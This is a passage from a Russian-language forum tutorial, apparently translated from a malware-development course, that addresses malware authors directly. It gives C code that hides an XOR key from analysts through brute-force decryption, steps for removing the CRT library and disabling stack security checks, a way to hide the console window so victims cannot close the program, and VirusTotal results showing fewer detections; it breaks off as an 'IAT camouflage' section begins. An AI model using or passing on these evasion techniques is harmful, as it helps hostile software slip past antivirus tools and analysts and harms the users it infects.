// Используется &#039;b&#039; в качестве ключа
for (int i = 0; i &lt; sKey; i++){
    pProtectedKey[i] = (BYTE)((pKey[i] + i) ^ b);
}

// Сохранение зашифрованного ключа через указатель
*ppProtectedKey = pProtectedKey;

// Освобождение буфера с исходным ключом
free(pKey);
}</code></pre>
	</div>
</div><br />
<b>Процесс дешифрования ключа</b><br />
<br />
Поскольку ключ шифрования, используемый для шифрования ключа, не сохраняется нигде, функция дешифрования должна угадать значение b, показанное в функции GenerateProtectedKey. Для этого функция дешифрования будет выполнять операцию XOR с первым байтом ключа, который является байтом-подсказкой, с разными ключами до тех пор, пока полученный байт не станет равным байту-подсказке исходного ключа. Когда это происходит, функция узнает, что было выбрано правильное значение b. Фрагмент кода ниже демонстрирует эту логику.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (((EncryptedKey[0] ^ b) - 0) == HintByte)
// Тогда значение &#039;b&#039; - это ключ шифрования XOR
else
// Тогда значение &#039;b&#039; не является ключом шифрования XOR, попробуйте с другим значением &#039;b&#039;</code></pre>
	</div>
</div><br />
Продолжая пример, когда 71 становится равным BA, это означает, что правильное значение b было угадано.<br />
<br />
<b>Функция дешифрования ключа</b><br />
<br />
Функция BruteForceDecryption требует тот же байт-подсказку, которая передавалась в функцию шифрования.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/* - HintByte : тот же байт-подсказка, что и в функции генерации ключа
    - pProtectedKey : зашифрованный ключ - sKey : размер ключа
    - ppRealKey : указатель на буфер PBYTE, который получит расшифрованный ключ */

BYTE BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {

BYTE      b         = 0;
PBYTE     pRealKey  = (PBYTE)malloc(sKey);

if (!pRealKey)
    return NULL;

while (1){

// Используя байт-подсказку, если он равен, то мы найдем значение &#039;b&#039;, необходимое для дешифрования ключа
if (((pProtectedKey[0] ^ b) - 0) == HintByte)
        break;
// иначе увеличьте &#039;b&#039; и попробуйте снова
    else
 b++;
}

// Обратный алгоритм XOR-шифрования, так как &#039;b&#039; теперь известен
for (int i = 0; i &lt; sKey; i++){
pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
}

    // Сохранение расшифрованного ключа через указатель
*ppRealKey = pRealKey;

return b;

}</code></pre>
	</div>
</div><br />
<b>Заключение</b><br />
<br />
Несмотря на свою простоту, подход с использованием &quot;грубой силы&quot; может быть использован для защиты ключей от анализа вирусными аналитиками и исследователями, которые пытаются извлечь ключ из бинарного файла. Это заставляет их отлаживать бинарный файл, чтобы понять, как генерируется ключ, что может быть полезным при использовании методов антианализа.<br />
<br />
<b>Удаление библиотеки CRT<br />
<br />
Введение</b><br />
<br />
До этого раздела все проекты кода компилировались с использованием опции &quot;Выпуск&quot; или &quot;Отладка&quot; в Visual Studio.<br />
Для разработчиков вредоносных программ важно понимать разницу между опциями компиляции &quot;Выпуск&quot; и &quot;Отладка&quot; в Visual Studio, а также последствия изменения настроек компилятора по умолчанию. Изменение настроек компилятора Visual Studio может повлиять на созданный двоичный файл, такое как уменьшение его размера или снижение энтропии.<br />
<br />
<b>Опция &quot;Выпуск&quot; против &quot;Отладка&quot;</b><br />
<br />
Конфигурации сборки &quot;Выпуск&quot; и &quot;Отладка&quot; определяют, как программа компилируется и выполняется, и каждая из них выполняет свою задачу и предоставляет разные возможности. Наиболее важные различия между этими двумя опциями приведены ниже.<br />
<br />
<b>Производительность</b> - Опция сборки &quot;Выпуск&quot; быстрее, чем опция &quot;Отладка&quot;. В режиме выпуска включены оптимизации компиляции, которые отключены в режиме &quot;Отладка&quot;.<br />
<br />
<b>Отладка</b> - Отладка приложений, созданных с использованием конфигурации сборки &quot;Отладка&quot;, упрощается, потому что в этом режиме отключены оптимизации компиляции, что делает код более доступным для отладки. Кроме того, конфигурация &quot;Отладка&quot; генерирует файлы символов отладки (.pdb), которые содержат информацию о скомпилированном исходном коде. Это позволяет отладчикам отображать дополнительную информацию, такую как переменные, функции и номера строк.<br />
<br />
<b>Развертывание</b> - Версия &quot;Выпуск&quot; приложения используется из-за увеличенной совместимости с их компьютерами, в отличие от версии &quot;Отладка&quot;, которая обычно требует дополнительных динамических библиотек (DLL), доступных только в Visual Studio, <b>что делает отладочные приложения совместимыми только с компьютерами, на которых установлена Visual Studio.<br />
<br />
Обработка исключений</b> - В конфигурации сборки &quot;Отладка&quot; Visual Studio может приостанавливать выполнение и отображать сообщение об ошибке в виде окна сообщения, когда возникает исключение, указывая имя переменной или номер строки, вызвавших повреждение стека, например. Такие исключения могут привести к зависанию программы, если она скомпилирована в режиме &quot;Выпуск&quot;.<br />
<br />
<b>Настройки компилятора по умолчанию</b><br />
<br />
Исходя из предыдущих аспектов, опция &quot;Выпуск&quot; предпочтительнее опции &quot;Отладка&quot;. Однако опция &quot;Выпуск&quot; все равно имеет несколько проблем.<br />
<br />
<b>Совместимость</b> - Некоторые приложения, использующие опцию &quot;Выпуск&quot;, всё равно могут вызывать ошибки, аналогичные приведенной ниже, если целевой компьютер не имеет установленной Visual Studio.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788477613.png"
		data-src="https://osint42.org/attachments/1746788477613-png.276/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788477613-png.276/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788477613.png"
			title="1746788477613.png"
			width="921" height="443" loading="lazy" />
	</div><br />
<br />
<b>Импортируемые функции CRT</b> - В таблице импорта (IAT) присутствуют несколько неразрешенных функций, которые невозможно разрешить с использованием методов, таких как API-хэширование. Эти функции импортируются из библиотеки CRT, что будет объяснено позже. Пока достаточно понимать, что в любом приложении, созданном настройками компилятора по умолчанию Visual Studio, есть несколько неиспользуемых импортированных функций. В качестве примера, IAT программы &#039;Hello World&#039; должна импортировать информацию только о функции printf, однако она импортирует следующие функции (вывод сокращен из-за размера).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788488515.png"
		data-src="https://osint42.org/attachments/1746788488515-png.277/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788488515-png.277/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788488515.png"
			title="1746788488515.png"
			width="1507" height="909" loading="lazy" />
	</div><br />
<br />
<b>Размер </b>- Сгенерированные файлы часто больше, чем они должны быть из-за оптимизаций компилятора по умолчанию. Например, следующая программа &quot;Hello World&quot; имеет размер около 11 килобайт.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788495332.png"
		data-src="https://osint42.org/attachments/1746788495332-png.278/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788495332-png.278/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788495332.png"
			title="1746788495332.png"
			width="1319" height="540" loading="lazy" />
	</div><br />
<br />
<b>Информация для отладки</b> - Использование опции &quot;Выпуск&quot; все равно может включать информацию, связанную с отладкой, и другие строки, которые могут быть использованы средствами безопасности для создания статических сигнатур. На изображениях ниже показан результат выполнения программы Strings.exe для программы &quot;Hello World&quot; (вывод сокращен из-за размера).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788502202.png"
		data-src="https://osint42.org/attachments/1746788502202-png.279/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788502202-png.279/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788502202.png"
			title="1746788502202.png"
			width="1316" height="388" loading="lazy" />
	</div><br />
<br />
<b>Библиотека CRT</b><br />
<br />
Библиотека CRT, также известная как Microsoft C Run-Time Library, представляет собой набор низкоуровневых функций и макросов, обеспечивающих базовую функциональность для стандартных программ на C и C++. Она включает функции управления памятью (например, malloc, memset и free), манипулирования строками (например, strcpy и strlen) и функции ввода-вывода (например, printf, wprintf и scanf).<br />
<br />
DLL-файлы библиотеки CRT названы vcruntimeXXX.dll, где XXX - это номер версии используемой библиотеки CRT. Также существуют DLL-файлы, такие как api-ms-win-crt-stdio-l1-1-0.dll, api-ms-win-crt-runtime-l1-1-0.dll и api-ms-win-crt-locale-l1-1-0.dll, которые также связаны с библиотекой CRT. Каждая из этих DLL выполняет конкретные функции и экспортирует несколько функций. Эти DLL-файлы связываются компилятором на этапе компиляции и, следовательно, находятся в таблице импорта (IAT) созданных программ.<br />
<br />
<b>Решение проблем совместимости</b><br />
<br />
По умолчанию, при компиляции приложения в Visual Studio, опция Runtime Library установлена на &quot;Multi-threaded DLL (/MD)&quot;. С этой опцией DLL-файлы библиотеки CRT связываются динамически, что означает их загрузку во время выполнения. Это вызывает проблемы совместимости, о которых упоминалось ранее. Для их решения установите опцию Runtime Library на &quot;Multi-threaded (/MT)&quot;, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788511295.png"
		data-src="https://osint42.org/attachments/1746788511295-png.280/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788511295-png.280/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788511295.png"
			title="1746788511295.png"
			width="1104" height="613" loading="lazy" />
	</div><br />
<br />
<b>Multi-threaded (/MT) </b><br />
<br />
Компилятор Visual Studio может быть настроен на статическую связь функций CRT, выбрав опцию &quot;Multi-threaded (/MT)&quot;. Это приводит к тому, что функции, такие как printf, будут представлены напрямую в созданной программе, а не импортируются из DLL-файлов библиотеки CRT. <b>Обратите внимание, что это увеличит размер конечного бинарного файла и добавит больше функций WinAPI в таблицу импорта, но удалит DLL-файлы библиотеки CRT.</b><br />
<br />
Использование опции &quot;Multi-threaded (/MT)&quot; для компиляции программы &quot;Hello World&quot; приводит к следующей таблице импорта.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788519874.png"
		data-src="https://osint42.org/attachments/1746788519874-png.281/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788519874-png.281/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788519874.png"
			title="1746788519874.png"
			width="1508" height="958" loading="lazy" />
	</div><br />
<br />
Размер бинарного файла также значительно увеличивается, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788526357.png"
		data-src="https://osint42.org/attachments/1746788526357-png.282/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788526357-png.282/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788526357.png"
			title="1746788526357.png"
			width="1212" height="374" loading="lazy" />
	</div><br />
<br />
<b>Библиотека CRT и отладка</b><br />
<br />
После удаления библиотеки CRT программа может быть скомпилирована только в режиме &quot;Выпуск&quot;. Это делает отладку кода более сложной. Поэтому рекомендуется удалять библиотеку CRT только после завершения отладки и разработки.<br />
<br />
<b>Дополнительные изменения компилятора</b><br />
<br />
Предыдущие разделы демонстрировали, как статически связать библиотеку CRT. <b>Однако идеальным решением было бы избегать зависимости от библиотеки CRT как статически, так и динамически</b>, так как это может привести к уменьшению размера бинарного файла и удалению ненужных импортированных функций и отладочной информации. Для этого необходимо внести изменения в несколько опций компиляции Visual Studio.<br />
<br />
<b>Отключение исключений C++</b><br />
<br />
Опция Enable C++ Exceptions используется для генерации кода, который правильно обрабатывает исключения, выбрасываемые кодом. Однако, поскольку библиотека CRT больше не связана, эта опция не требуется и должна быть отключена.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788535642.png"
		data-src="https://osint42.org/attachments/1746788535642-png.283/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788535642-png.283/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788535642.png"
			title="1746788535642.png"
			width="1199" height="669" loading="lazy" />
	</div><br />
<br />
<b>Отключение оптимизации всей программы</b><br />
<br />
Опция Whole Program Optimization должна быть отключена, чтобы предотвратить выполнение компилятором оптимизаций, которые могут повлиять на стек. Отключение этой опции предоставляет полный контроль над скомпилированным кодом.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788542313.png"
		data-src="https://osint42.org/attachments/1746788542313-png.284/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788542313-png.284/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788542313.png"
			title="1746788542313.png"
			width="1178" height="605" loading="lazy" />
	</div><br />
<br />
<b>Отключение отладочной информации</b><br />
<br />
Отключите опции Generate Debug Info и Generate Manifest, чтобы удалить добавленную отладочную информацию.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788550570.png"
		data-src="https://osint42.org/attachments/1746788550570-png.285/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788550570-png.285/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788550570.png"
			title="1746788550570.png"
			width="1152" height="658" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788556750.png"
		data-src="https://osint42.org/attachments/1746788556750-png.286/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788556750-png.286/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788556750.png"
			title="1746788556750.png"
			width="1264" height="717" loading="lazy" />
	</div><br />
<br />
<b>Игнорирование всех библиотек по умолчанию</b><br />
<br />
Установите опцию Ignore All Default Libraries на &quot;Yes (/NODEFAULTLIB)&quot;, чтобы исключить связывание системных библиотек по умолчанию компилятором с программой. Это приведет к исключению связывания библиотеки CRT, а также других библиотек. В этом случае пользователь должен предоставить необходимые функции, которые обычно предоставляются этими библиотеками по умолчанию. На изображении ниже показано установление опции &quot;Yes (/NODEFAULTLIB)&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788563859.png"
		data-src="https://osint42.org/attachments/1746788563859-png.287/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788563859-png.287/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788563859.png"
			title="1746788563859.png"
			width="1181" height="665" loading="lazy" />
	</div><br />
<br />
К сожалению, компиляция с этой опцией приводит к ошибкам, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788570730.png"
		data-src="https://osint42.org/attachments/1746788570730-png.288/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788570730-png.288/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788570730.png"
			title="1746788570730.png"
			width="971" height="204" loading="lazy" />
	</div><br />
<br />
<b>Установка символа точки входа</b><br />
<br />
Первая ошибка &quot;LNK2001 - unresolved external symbol mainCRTStartup&quot; указывает на то, что компилятор не смог найти определение символа &quot;mainCRTStartup&quot;. Это ожидаемо, так как &quot;mainCRTStartup&quot; является точкой входа для программы, связанной с библиотекой CRT, что не имеет места в данном случае. Чтобы решить эту проблему, следует установить новый символ точки входа, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788578603.png"
		data-src="https://osint42.org/attachments/1746788578603-png.289/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788578603-png.289/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788578603.png"
			title="1746788578603.png"
			width="1150" height="649" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788583699.png"
		data-src="https://osint42.org/attachments/1746788583699-png.290/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788583699-png.290/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788583699.png"
			title="1746788583699.png"
			width="1140" height="635" loading="lazy" />
	</div><br />
<br />
Символ &quot;main&quot; представляет собой функцию main в исходном коде. Для выбора другой функции в качестве точки входа просто установите символ точки входа на имя этой функции. Повторная компиляция приводит к меньшему количеству ошибок, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788590169.png"
		data-src="https://osint42.org/attachments/1746788590169-png.291/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788590169-png.291/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788590169.png"
			title="1746788590169.png"
			width="919" height="141" loading="lazy" />
	</div><br />
<br />
<b>Отключение проверки безопасности</b><br />
<br />
Следующая ошибка, &quot;LNK2001 - unresolved external symbol __security_check_cookie&quot;, означает, что компилятор не нашел символ &quot;__security_check_cookie&quot;. Этот символ используется для выполнения проверки стековой куки, которая является функцией безопасности, предотвращающей переполнение буфера стека. Чтобы решить эту проблему, установите опцию Security Check на &quot;Disable Security Check (/Gs-)&quot;, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788597534.png"
		data-src="https://osint42.org/attachments/1746788597534-png.292/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788597534-png.292/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788597534.png"
			title="1746788597534.png"
			width="1180" height="644" loading="lazy" />
	</div><br />
<br />
<b>Отключение проверок SDL</b><br />
<br />
После отключения проверки безопасности ошибка исчезает, но появляется новое предупреждение.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788603502.png"
		data-src="https://osint42.org/attachments/1746788603502-png.293/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788603502-png.293/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788603502.png"
			title="1746788603502.png"
			width="1019" height="157" loading="lazy" />
	</div><br />
<br />
Предупреждение &quot;D9025 - overriding &#039;/sdl&#039; with &#039;/GS-&#039;&quot; можно решить, отключив проверки Security Development Lifecycle (SDL).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788616525.png"
		data-src="https://osint42.org/attachments/1746788616525-png.294/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788616525-png.294/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788616525.png"
			title="1746788616525.png"
			width="1166" height="616" loading="lazy" />
	</div><br />
<br />
Остаются две неразрешенные ошибки символов, которые решаются в разделе Замена функций библиотеки CRT ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788625598.png"
		data-src="https://osint42.org/attachments/1746788625598-png.295/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788625598-png.295/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788625598.png"
			title="1746788625598.png"
			width="1054" height="155" loading="lazy" />
	</div><br />
<br />
<b>Замена функций библиотеки CRT</b><br />
<br />
Из-за удаления библиотеки CRT остались две неразрешенные ошибки из-за использования функции printf для вывода на консоль, хотя библиотека CRT была удалена из программы.<br />
<br />
При удалении библиотеки CRT необходимо написать собственные версии функций, такие как printf, strlen, strcat, memcpy. Для этой цели можно использовать библиотеки, например, <a href="https://github.com/vxunderground/VX-API" target="_blank" class="link link--external" rel="noopener">VX-API</a>. Например, <a href="https://github.com/vxunderground/VX-API/blob/main/VX-API/StringCompare.cpp" target="_blank" class="link link--external" rel="noopener">StringCompare.cpp</a> заменяет функцию strcmp для сравнения строк.<br />
<br />
<b>Замена функции Printf</b><br />
<br />
Для демонстрационной программы, используемой в этом разделе, функция printf заменяется следующей макроинструкцией.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }</code></pre>
	</div>
</div><br />
Макроинструкция PRINTA принимает два аргумента:<br />
<ul>
<li data-xf-list-type="ul">STR - Строка формата, которая определяет, как выводить результат.</li>
<li data-xf-list-type="ul"><b>VA_ARGS</b> или ... - Аргументы, которые нужно вывести. Макроинструкция PRINTA выделяет кучевой буфер размером 1024 байта, затем использует функцию wsprintfA для записи отформатированных данных из переменных аргументов (<b>VA_ARGS</b>) в буфер с использованием строки формата (STR). Затем используется функция WriteConsoleA WinAPI для записи полученной строки на консоль, которая получается через функцию GetStdHandle WinAPI.</li>
</ul>Замена printf на PRINTA приводит к тому, что программа Hello World становится независимой от библиотеки CRT. Этот код устраняет оставшиеся ошибки и теперь может успешно компилироваться.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }
 
int main() {
    PRINTA(&quot;Hello World ! \n&quot;);
    return 0;
}</code></pre>
	</div>
</div><br />
<b>Создание вредоносного ПО, независимого от библиотеки CRT</b><br />
<br />
При создании вредоносного программного обеспечения, которое не использует библиотеку CRT, следует учесть несколько моментов.<br />
<br />
<b>Использование внутренних функций</b><br />
<br />
Некоторые функции и макросы в Visual Studio используют функции CRT для выполнения своих задач. Например, макрос ZeroMemory использует функцию CRT memset для заполнения указанного буфера нулями. Это требует от разработчика поиска альтернативы этому макросу, так как его нельзя использовать. В этом случае может использоваться функция из <a href="https://github.com/vxunderground/VX-API/blob/main/VX-API/CopyMemoryEx.cpp" target="_blank" class="link link--external" rel="noopener">CopyMemoryEx.cpp</a> в качестве замены.<br />
<br />
Другим решением может быть ручное установление пользовательских версий функций, основанных на CRT, таких как memset. Это заставляет компилятор обрабатывать эту пользовательскую функцию вместо экспортированной версии CRT. Последовательно макросы, такие как ZeroMemory, также будут использовать эту пользовательскую функцию.<br />
<br />
Для демонстрации этого можно указать пользовательскую версию функции memset компилятору следующим образом, используя ключевое слово intrinsic.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;

// Ключевое слово `extern` задает функцию `memset` как внешнюю функцию.
extern void* __cdecl memset(void*, int, size_t);

// Макросы #pragma intrinsic(memset) и #pragma function(memset) - это инструкции компилятора, специфичные для Microsoft.
// Они заставляют компилятор генерировать код для функции memset с использованием встроенной интригирующей функции.
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {
    // логика, аналогичная memset
    unsigned char* p = (unsigned char*)Destination;
    while (Size &gt; 0) {
        *p = (unsigned char)Value;
        p++;
        Size--;
    }
    return Destination;
}

int main() {
    PVOID pBuff = HeapAlloc(GetProcessHeap(), 0, 0x100);
    if (pBuff == NULL)
        return -1;

    // это будет использовать нашу версию &#039;memset&#039; вместо версии CRT Library
    ZeroMemory(pBuff, 0x100);

    HeapFree(GetProcessHeap(), 0, pBuff);

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Скрытие окна консоли</b><br />
<br />
Вредоносное программное обеспечение не должно создавать окно консоли при выполнении, так как это вызывает подозрение и позволяет пользователю завершить программу, закрыв окно. Для предотвращения этого можно использовать функцию ShowWindow(NULL, SW_HIDE) в начале функции точки входа, хотя это требует времени (в миллисекундах) и может вызвать заметное мерцание.<br />
<br />
Лучшим решением является установка программы для компиляции как GUI-программы, установив опцию SubSystem Visual Studio в &quot;Windows (/SUBSYSTEM:WINDOWS)&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788649003.png"
		data-src="https://osint42.org/attachments/1746788649003-png.296/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788649003-png.296/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788649003.png"
			title="1746788649003.png"
			width="1211" height="684" loading="lazy" />
	</div><br />
<br />
<b>Демонстрация</b><br />
<br />
После выполнения всех описанных в этом разделешагов, получаются следующие результаты.<br />
<br />
Во-первых, размер исполняемого файла уменьшается с 112,5 килобайт до примерно 3 килобайт.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788656147.png"
		data-src="https://osint42.org/attachments/1746788656147-png.297/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788656147-png.297/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788656147.png"
			title="1746788656147.png"
			width="1286" height="310" loading="lazy" />
	</div><br />
<br />
Затем в IAT не обнаружено неиспользуемых функций.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788661978.png"
		data-src="https://osint42.org/attachments/1746788661978-png.298/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788661978-png.298/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788661978.png"
			title="1746788661978.png"
			width="1145" height="769" loading="lazy" />
	</div><br />
<br />
В бинарном файле обнаружено меньше строк без отладочной информации.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788669818.png"
		data-src="https://osint42.org/attachments/1746788669818-png.299/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788669818-png.299/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788669818.png"
			title="1746788669818.png"
			width="1389" height="750" loading="lazy" />
	</div><br />
<br />
<b>Наконец, удаление библиотеки CRT приводит к меньшему детекту. </b><br />
<br />
Файл загружается на VirusTotal дважды: первый раз с использованием опции &quot;Multi-threaded (/MT)&quot;, чтобы статически связать библиотеку CRT, а второй раз после полного удаления библиотеки CRT.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788677217.png"
		data-src="https://osint42.org/attachments/1746788677217-png.300/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788677217-png.300/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788677217.png"
			title="1746788677217.png"
			width="913" height="224" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788683293.png"
		data-src="https://osint42.org/attachments/1746788683293-png.301/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788683293-png.301/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788683293.png"
			title="1746788683293.png"
			width="911" height="231" loading="lazy" />
	</div><br />
<br />
<b>IAT Camouflage<br />
<br />
Введение</b><br />
<br />
Удаление библиотеки C Runtime из конечного бинарного файла позволяет очистить IAT от неиспользуемых функций WinAPI. Однако это может вызвать подозрение, если бинарный файл импортирует очень мало функций WinAPI, особенно если это совмещается с хэшированием API, что может даже привести к отсутствию импортированных функций.<br />
<br />
<b>Для разработчика вредоносных программ важно, чтобы реализация вредоносного ПО выглядела нормально.</b> Иметь реализацию с фиктивным IAT более эффективно, чем отсутствие импортированных функций. Этот модуль подробно рассмотрит эту концепцию.<br />
<br />
Давайте начнем с бинарного файла с именем IatCamouflage.exe, который не использует библиотеку CRT и был скомпилирован аналогично тому, как показанно выше.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
